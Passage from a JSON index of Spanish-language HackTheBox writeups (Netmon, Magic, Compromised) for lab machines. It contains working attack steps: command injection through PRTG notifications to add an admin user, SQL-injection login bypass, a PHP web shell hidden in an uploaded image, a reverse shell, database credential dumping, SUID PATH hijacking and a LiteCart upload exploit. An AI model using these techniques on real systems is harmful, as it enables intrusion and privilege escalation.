txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&amp;windowslogindomain_10=&amp;windowsloginusername_10=&amp;windowsloginpassword_10=&amp;timeout_10=60&amp;active_15=0&amp;accesskeyid_15=&amp;secretaccesskeyid_15=&amp;arn_15=&amp;subject_15=&amp;message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;active_16=0&amp;isusergroup_16=1&amp;addressgroupid_16=200%7CPRTG+Administrators&amp;ticketuserid_16=100%7CPRTG+System+Administrator&amp;subject_16=%25device+%25name+%25status+%25down+(%25message)&amp;message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&amp;autoclose_16=1&amp;objecttype=notification&amp;id=new&amp;targeturl=%2Fmyaccount. htm%3Ftabid%3D2 );name_=create_user&amp;tags_=&amp;active_=1&amp;schedule_=-1|None|&amp;postpone_=1&amp;comments=&amp;summode_=2&amp;summarysubject_=[%sitename] %summarycount Summarized Notifications&amp;summinutes_=1&amp;accessrights_=1&amp;accessrights_=1&amp;accessrights_201=0&amp;active_1=0&amp;addressuserid_1=-1&amp;addressgroupid_1=-1&amp;address_1=&amp;subject_1=[%sitename] %device %name %status %down (%message)&amp;contenttype_1=text/html&amp;customtext_1=&amp;priority_1=0&amp;active_17=0&amp;addressuserid_17=-1&amp;addressgroupid_17=-1&amp;message_17=[%sitename] %device %name %status %down (%message)&amp;active_8=0&amp;addressuserid_8=-1&amp;addressgroupid_8=-1&amp;address_8=&amp;message_8=[%sitename] %device %name %status %down (%message)&amp;active_2=0&amp;eventlogfile_2=application&amp;sender_2=PRTG Network Monitor&amp;eventtype_2=error&amp;message_2=[%sitename] %device %name %status %down (%message)&amp;active_13=0&amp;sysloghost_13=&amp;syslogport_13=514&amp;syslogfacility_13=1&amp;syslogencoding_13=1&amp;message_13=[%sitename] %device %name %status %down (%message)&amp;active_14=0&amp;snmphost_14=&amp;snmpport_14=162&amp;snmpcommunity_14=&amp;snmptrapspec_14=0&amp;messageid_14=0&amp;message_14=[%sitename] %device %name %status %down (%message)&amp;senderip_14=&amp;active_9=0&amp;url_9=&amp;urlsniselect_9=0&amp;urlsniname_9=&amp;postdata_9=&amp;active_10=0&amp;active_10=10&amp;address_10=Demo EXE Notification - OutFile. ps1&amp;message_10= C:\Users\Public\tester. txt;net user pentest P3nT3st! /add &amp;windowslogindomain_10=&amp;windowsloginusername_10=&amp;windowsloginpassword_10=&amp;timeout_10=60&amp;active_15=0&amp;accesskeyid_15=&amp;secretaccesskeyid_15=&amp;arn_15=&amp;subject_15=&amp;message_15=[%sitename] %device %name %status %down (%message)&amp;active_16=0&amp;isusergroup_16=1&amp;addressgroupid_16=200|PRTG Administrators&amp;ticketuserid_16=100|PRTG System Administrator&amp;subject_16=%device %name %status %down (%message)&amp;message_16=Sensor: %nameStatus: %status %down&amp;autoclose_16=1&amp;objecttype=notification&amp;id=new&amp;targeturl=/myaccount. htm?tabid=2Vemos que la data se enviar a un parametro message_10, en donde crea un usuario de nombre pentest a nivel de sistema net user pentest P3nT3st! /add. Podemos aprovecharnos de este y ejecutar una instrucción similar a la del exploit, donde crearemos un usuario al cual pondre de nombre pentest y ademas lo añadire al grupo de Administradores. Nos dirigimos a la ruta a donde manda la petición, damos en Add new Notification.  Creamos un nombre de Notificación, en este caso Nuevo.  y ahora activamos la función Execute Program podemos ver varios inputs y si los inspeccionamos encontramos el de message_10 que corresponde a Parameter Ejecutamos en el campo la instrucción, donde crearemos nuestro usuario y lo añadiremos al grupo administrador.  Guardamos y ahora en la notificación creada le damos en el simbolo de la campana Send.  Le damos ok en la confirmación y ya deberia haberse ejecutado la acción. Como vimos que el puerto 445 esta abierto podemos usar crackmapexec y validamos que el usuario fmiracle ahora existe y forma parte de los usuarios administradores. ❯ crackmapexec smb 10. 10. 10. 152 -u 'pentest' -p 'p3nT3st!'SMB     10. 10. 10. 152  445  NETMON      [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)SMB     10. 10. 10. 152  445  NETMON      [+] netmon\pentest:p3nT3st! (Pwn3d!)Ahora haciendo uso del servicio de administración remota de windows, podemos conectarnos por el puerto 5985, usando la herramienta evil-winrm. ❯ evil-winrm -i 10. 10. 10. 152 -u 'pentest' -p 'p3nT3st!'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\pentest\Documents&gt; cd C:\UsersUna vez ya en el sistema podemos dirigirnos al directorio personal del usuario Administrator y visualizar la segunda flag root. txt. *Evil-WinRM* PS C:\Users&gt; cd Administrator*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txt491b992fe825994a2fad4199afd2ca76"
    }, {
    "id": 31,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Magic",
    "title": "Maquina Magic - htb writeup",
    "body": "2023/06/13 - En esta ocasión vamos a resolver la máquina Magic de la plataforma de hackthebox correspondiente a una linux dificultad media, la cual explotaremos evadiendo el panel de logeo mediante una inyeccion simple en sql, despues aprovecharemos de una mala sanizitación de subida de archivos derivandola en una ejecución remota de comandos; una vez dentro del sistema obtendremos credenciales enumerando la base de datos y finamente aprocecharemos el permiso suid de un binario, para ejecutar una path hijacking que nos dara acceso como el usuario root. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Magic❯ ls MagicSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 185PING 10. 10. 10. 185 (10. 10. 10. 185) 56(84) bytes of data. 64 bytes from 10. 10. 10. 185: icmp_seq=1 ttl=63 time=137 ms--- 10. 10. 10. 185 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 137. 232/137. 232/137. 232/0. 000 msVemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 185 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-13 21:00 GMTInitiating SYN Stealth Scan at 21:00Scanning 10. 10. 10. 185 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 185Discovered open port 22/tcp on 10. 10. 10. 185Completed SYN Stealth Scan at 21:00, 16. 68s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 185Host is up, received user-set (0. 12s latency). Scanned at 2023-06-13 21:00:26 GMT for 17sNot shown: 65533 closed tcp ports (reset)PORT  STATE SERVICE REASON22/tcp open ssh   syn-ack ttl 6380/tcp open http  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 16. 83 seconds      Raw packets sent: 82274 (3. 620MB) | Rcvd: 81681 (3. 267MB)Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 80 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,80 10. 10. 10. 185 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-13 21:01 GMTNmap scan report for 10. 10. 10. 185Host is up (0. 20s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)|  256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)|_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: Magic PortfolioService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20. 34 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3       80   HTTP   Apache httpd 2. 4. 29   Seguidamente vamos a usar la herramienta whatweb para ver por consola el gestor de contenido de la pagina web. ❯ whatweb http://10. 10. 10. 185http://10. 10. 10. 185 [200 OK] Apache[2. 4. 29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 185], JQuery, Script, Title[Magic Portfolio]Explotación #: Vamos seguidamente a abrir la web en nuestro navegador.  Observamos una que la pagina se compone de una serie de imagenes y tambien podemos ver que existe un enlace a un login que procederemos a visitar.  Para tratar de averiguar la ruta donde sube las imagenes, podemos usar el inspeccionador de elementos y mostrar la ruta de donde cargan las imagenes que corresponde a /uploads Probamos a tratar de logearnos con credenciales por defecto pero nos resulta imposible. Como estamos frente a un panel de logeo, podemos tratar de ocasionar un error en los inputs mediante una sql injection.  Como resultado podemos logramos logearnos exitosamente y nos redirige a un panel donde podemos subir una imagen. Para ver si bien sanitizada la subida de archivos, probaremos con subir un archivo de nombre cmd. php que mediante el uso de etiquetas preformateadas y haciendo uso de la función shell_exec con el parametro cmd ejecutar comandos.  &lt;?php echo  &lt;pre&gt;  . shell_exec($_REQUEST['cmd']) .  &lt;/pre&gt; ;?&gt;Procedemos a subir el archivo pero vemos que solo admite formatos de imagen.  Podemos probar a renombrar nuestro archivo cmd. php y asignarle una doble extensión para asi tratar de bypasear la subida.  Vemos que esta vez cambie el mensaje de error, y detecta que estamos tratando de manipular la subida.  Debemos de tener en cuenta que en base a los magic numbers que son los primeros bytes de los archivos se validan los tipos de archivos en este caso si con el comando file tratamos de validar nuestro archivo cmd. php. png. ❯ file cmd. php. pngcmd. php. png: PHP script, ASCII textNos detecta que es un php script, pero si agregamos la cabezera GIF8; al inicio de nuestro archivo ahora nos lo detectara como gif image. ❯ file cmd. php. pngcmd. php. png: GIF image data 16188 x 26736Probaremos a subir nuevamente el archivo modificado.  Obtenemos el mismo error, asi que esta vez vamos a descargar una imagen cualquier de google.  Ahora vamos a alterar su contenido añadiendo una intrucción en php y añadiendo la extensión . php.  Subimos nuevamente el archivo y esta vez nos lo hace correctamente.  Vamos a la ruta donde se suben las imagenes que la obtuvimos previamente y efectivamente podemos ver nuestro archivo, aunque en un formato no legible por ser binario.  Validamos si podemos ejecutar comandos gracias a la instrucción php que añadimos y tenemos ejecución de comandos.  Ahora con bash vamos a enviarnos una reverse shell, para ello nos pondremos en escucha con ncat en el puerto 443 y obtenemos acceso como el usuario www-data ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 185. Ncat: Connection from 10. 10. 10. 185:51270. bash: cannot set terminal process group (1136): Inappropriate ioctl for devicebash: no job control in this shellwww-data@ubuntu:/var/www/Magic/images/uploads$ whoamiwhoamiwww-dataAhora como de costumbre vamos a otorgarnos una tty full interactiva. www-data@ubuntu:/var/www/Magic/images/uploads$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullwww-data@ubuntu:/var/www/Magic/images/uploads$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermwww-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xtermwww-data@ubuntu:/var/www/Magic/images/uploads$ export SHELL=bash www-data@ubuntu:/var/www/Magic/images/uploads$ stty rows 45 columns 184Si volvemos al directorio Magic, encontraremos un archivo db. php5 el cual contiene unas credenciales. www-data@ubuntu:/var/www/Magic$ lsassets	db. php5 images index. php login. php logout. php upload. phpwww-data@ubuntu:/var/www/Magic$ cat db. php5 &lt;?phpclass Database{  private static $dbName = 'Magic' ;  private static $dbHost = 'localhost' ;  private static $dbUsername = 'theseus';  private static $dbUserPassword = 'iamkingtheseus';  private static $cont = null;  public function __construct() {    die('Init function is not allowed');  }  public static function connect()  {    // One connection through whole application    if ( null == self::$cont )    {      try      {        self::$cont = new PDO(  mysql:host= . self::$dbHost.  ; .  dbname= . self::$dbName, self::$dbUsername, self::$dbUserPassword);      }      catch(PDOException $e)      {        die($e-&gt;getMessage());      }    }    return self::$cont;  }  public static function disconnect()  {    self::$cont = null;  }}Si tratamos de usar las credenciales para conectarnos como theseus, vemos que no corresponde, pero podemos tratar de conectarnos a la base de datos. Y al no existir mysql, podemos usar mysqlshow www-data@ubuntu:/var/www/Magic$ su theseusPassword: su: Authentication failurewww-data@ubuntu:/var/www/Magic$ mysqlshow -utheseus -piamkingtheseusmysqlshow: [Warning] Using a password on the command line interface can be insecure. +--------------------+|   Databases   |+--------------------+| information_schema || Magic       |+--------------------+Podemos enumerar las bases de datos utilizadas, y ahora usaremos mysqldump para dumpear las datos almancenados en la base de datos Magic www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magicmysqldump: [Warning] Using a password on the command line interface can be insecure. -- MySQL dump 10. 13 Distrib 5. 7. 29, for Linux (x86_64)---- Host: localhost  Database: Magic-- -------------------------------------------------------- Server version	5. 7. 29-0ubuntu0. 18. 04. 1/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;/*!40101 SET NAMES utf8 */;/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;/*!40103 SET TIME_ZONE='+00:00' */;/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;---- Table structure for table `login`--DROP TABLE IF EXISTS `login`;/*!40101 SET @saved_cs_client   = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATE TABLE `login` ( `id` int(6) NOT NULL AUTO_INCREMENT, `username` varchar(50) NOT NULL, `password` varchar(100) NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `username` (`username`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;/*!40101 SET character_set_client = @saved_cs_client */;---- Dumping data for table `login`--LOCK TABLES `login` WRITE;/*!40000 ALTER TABLE `login` DISABLE KEYS */;INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');/*!40000 ALTER TABLE `login` ENABLE KEYS */;UNLOCK TABLES;/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;-- Dump completed on 2023-06-13 15:00:33Obtenemos unas credenciales correspondientes al usuario theseus, ahora podemos migrar al usuario, dirigirnos al directorio del usuario y visualizar la primera flag user. txt www-data@ubuntu:/var/www/Magic$ su theseusPassword: theseus@ubuntu:/var/www/Magic$ whoamitheseustheseus@ubuntu:/var/www/Magic$ cd /home/theseus/theseus@ubuntu:~$ cat user. txt fb197a83208d0d99ecdbed4ee83fc4f0Escalada de Privilegios #: Listamos los archivos con privilegios suid, vemos uno inusual /bin/sysinfo theseus@ubuntu:~$ find / -perm -4000 2&gt;/dev/null | grep -v  snap /usr/sbin/pppd/usr/bin/newgrp/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/bin/pkexec/usr/bin/chsh/usr/bin/traceroute6. iputils/usr/bin/arping/usr/bin/vmware-user-suid-wrapper/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1. 0/dbus-daemon-launch-helper/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/lib/xorg/Xorg. wrap/bin/umount/bin/fusermount/bin/sysinfo/bin/mount/bin/su/bin/pingSi vemos los caracteres imprimibles del binario con la ayuda de strings, podemos ver que hace uso del comando fdisk, de manera relativa. theseus@ubuntu:~$ strings /bin/sysinfo/lib64/ld-linux-x86-64. so. 2libstdc++. so. 6__gmon_start___ITM_deregisterTMCloneTable====================Hardware Info====================lshw -short====================Disk Info====================fdisk -l====================CPU Info====================cat /proc/cpuinfo====================MEM Usage=====================free -h;*3$ zPLRGCC: (Ubuntu 7. 4. 0-1ubuntu1~18. 04. 1) 7. 4. 0crtstuff. cderegister_tm_clonesLo que haremos ahora sera efectuar un path hijacking, donde alteraremos la ruta de nuestro path y crearemos un archivo de nombre fdisk donde le otorgaremos el privilegio suid a la bash, de modo tal que al ejecutar /bin/sysinfo hara uso del comando fdisk y al haber manipulado nuestro path lo hara desde la ruta actual que especifiquemos donde tendremos nuestro archivo creado, esto debido a que fdisk no se esta aplicando de manera absoluta. Te dejo el siguiente articulo para que veas mas a fondo esta vulnerabilidad.  https://deephacking. tech/path-hijacking-y-library-hijacking/#path-hijackingProcedemos a crearnos el archivo en la ruta /tmp, que generalamente es donde se tiene permiso de escritura y le damos permiso de ejecución. theseus@ubuntu:/tmp$ cat fdisk #!/bin/bashchmod u+s /bin/bashtheseus@ubuntu:/tmp$ chmod +x fdiskAhora manilupalaremos nuestro path para que este tire desde la ruta /tmp theseus@ubuntu:/tmp$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamestheseus@ubuntu:/tmp$ export PATH=/tmp:$PATHtheseus@ubuntu:/tmp$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesEjecutamos el /bin/sysinfo y vemos el privilegios de la /bin/bash fue asignado correctamente. theseus@ubuntu:/tmp$ /bin/sysinfo====================Hardware Info====================H/W path      Device   Class   Description====================================================               system   VMware Virtual Platform/0              bus    440BX Desktop Reference Platformtheseus@ubuntu:/tmp$ ls -l /bin/bash-rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bashAhora solo debemos ejecutar el comando bash -p y estariamos como el usuario root, seguidamente podemos dirigirnos al directorio del usuario root y visualizar la segunda flag root. txt. theseus@ubuntu:/tmp$ bash -pbash-4. 4# whoamirootbash-4. 4# cd /rootbash-4. 4# cat root. txt a4f562d7949903aa1bf84994c94ce9e3"
    }, {
    "id": 32,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Compromissed",
    "title": "Maquina Compromised - htb writeup",
    "body": "2023/06/13 - Hoy vamos a resolver la máquina Compromised de la plataforma de hackthebox correspondiente a una linux dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a litercart que conjunto al crearnos una función propia en php que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de UDF en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un rootkit ganar tener acceso al sistema como el usuario privilegiado rooot. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Compromissed❯ ls CompromissedSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 207PING 10. 10. 10. 207 (10. 10. 10. 207) 56(84) bytes of data. 64 bytes from 10. 10. 10. 207: icmp_seq=1 ttl=63 time=207 ms--- 10. 10. 10. 207 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 206. 547/206. 547/206. 547/0. 000 msVemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 207 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-13 15:35 GMTInitiating SYN Stealth Scan at 15:35Scanning 10. 10. 10. 207 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 207Discovered open port 22/tcp on 10. 10. 10. 207Completed SYN Stealth Scan at 15:35, 26. 53s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 207Host is up, received user-set (0. 13s latency). Scanned at 2023-06-13 15:35:29 GMT for 26sNot shown: 65533 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE REASON22/tcp open ssh   syn-ack ttl 6380/tcp open http  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 65 seconds      Raw packets sent: 131087 (5. 768MB) | Rcvd: 22 (968B)Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 80 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,80 10. 10. 10. 207 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-13 15:36 GMTNmap scan report for 10. 10. 10. 207Host is up (0. 21s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)|  256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)|_ 256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))| http-title: Legitimate Rubber Ducks | Online Store|_Requested resource was http://10. 10. 10. 207/shop/en/|_http-server-header: Apache/2. 4. 29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19. 60 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3       80   HTTP   Apache httpd 2. 4. 29   Seguidamente vamos a usar la herramienta whatweb para ver por consola el gestor de contenido de la pagina web. ❯ whatweb http://10. 10. 10. 207http://10. 10. 10. 207 [302 Found] Apache[2. 4. 29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 207], RedirectLocation[/shop]http://10. 10. 10. 207/shop [301 Moved Permanently] Apache[2. 4. 29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 207], RedirectLocation[http://10. 10. 10. 207/shop/], Title[301 Moved Permanently]http://10. 10. 10. 207/shop/ [302 Found] Apache[2. 4. 29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 207], RedirectLocation[http://10. 10. 10. 207/shop/en/], X-Powered-By[LiteCart]http://10. 10. 10. 207/shop/en/ [200 OK] Apache[2. 4. 29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], Email[admin@compromised. htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 207], JQuery[3. 3. 1], Open-Graph-Protocol[website], PasswordField[password], Script, Title[Legitimate Rubber Ducks | Online Store], X-Powered-By[LiteCart]La herramienta nos reporta bastante información la cual incluye rutas, usuaruos y dominios, vamos a proceder a abrir la web en el navegador. Vemos que el servicio corresponde a Litecart.  LiteCart es una plataforma de comercio electrónico gratuita fundada por el desarrollador web sueco T. Almroth. LiteCart está inspirado en lo mejor de los mundos y lo que podría haberse hecho mejor en soluciones alternativas de comercio electrónico.  Explotación #: Vamos a comenzar descubriendo rutas en la web, para ello primero usaremos unos de los scripts de nmap http-enum. ❯ nmap --script http-enum -p80 10. 10. 10. 207 -oN webScanStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-13 15:42 GMTNmap scan report for 10. 10. 10. 207Host is up (0. 22s latency). PORT  STATE SERVICE80/tcp open http| http-enum: |_ /backup/: Backup folder w/ directory listingNmap done: 1 IP address (1 host up) scanned in 32. 04 secondsDescubirmos una ruta valida que dentro tiene un archivo comprimido que procederemos a traer y descomprimir en nuestra maquina.  Una vez lo descomprimimos en nuestra maquina, podemos ver un directorio de nombre shop el cual incluye a su vez varios directorios y archivos, en los cuale ❯ cd shop❯ ls admin  cache  data  ext  images  includes  logs  pages  vqmod  favicon. ico  index. php ﮧ robots. txtUna vez dentro vamos a tratar de buscar credenciales, filtrando por archivos de configuración con la siguiente expresion: ❯ find . -name \*config\* | xargs cat | grep -iE  user|pass|key   'name' =&gt; language::translate('title_users', 'Users'),  'default' =&gt; 'users',   'users' =&gt; 'users. inc. php',   'edit_user' =&gt; 'edit_user. inc. php',  order by priority, `key`;    'title' =&gt; language::translate('settings_group:title_'. $group['key'], $group['name']),   'doc' =&gt; $group['key'],  $app_config['docs'][$group['key']] = 'settings. inc. php';   'icon' =&gt; 'fa-user',   'key' =&gt; 'product_modal_window',   'key' =&gt; 'sidebar_parallax_effect',   'key' =&gt; 'compact_category_tree',   'key' =&gt; 'cookie_acceptance', define('DB_USERNAME', 'root'); define('DB_PASSWORD', 'changethis'); define('DB_TABLE_USERS',               '`'. DB_DATABASE . '`. `'. DB_TABLE_PREFIX . 'users`'); Password Encryption Salt define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');Obtenemos unas credenciales correspondientes a la base de datos root: changethis que procederemos a almancenar. Ahora podemos ver qu dentro del directorio admin, vemos un archivo de nombre login. php, validamos si existe una ruta correspondiente en la web y efectivamente existe.  despues al leer el archivo login. php, podemos ver que comentada una ruta oculta con un archivo txt.  Al validar la ruta obtenemos nuevas credenciales.  Validamos las credenciales y nos conectamos al servicio.  Ahora vamos a buscar si existen vulnerabilidades asociadas a litecart y vemos que existe un exploit en python2. ❯ searchsploit litecart----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------LiteCart 2. 1. 2 - Arbitrary File Upload                                                        | php/webapps/45267. py----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsNos traemos el exploit y lo ejecutamos con los parametros especificos ❯ python2 litecart. py -t http://10. 10. 10. 207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'Shell =&gt; http://10. 10. 10. 207/shop/admin/. . /vqmod/xml/D5B8I. php?c=idvalidamos en la web el enlace generado pero vemos que no funciona, seguidamente vamos a modificar el exploit cambiando el nombre aleatorio que nis genera por 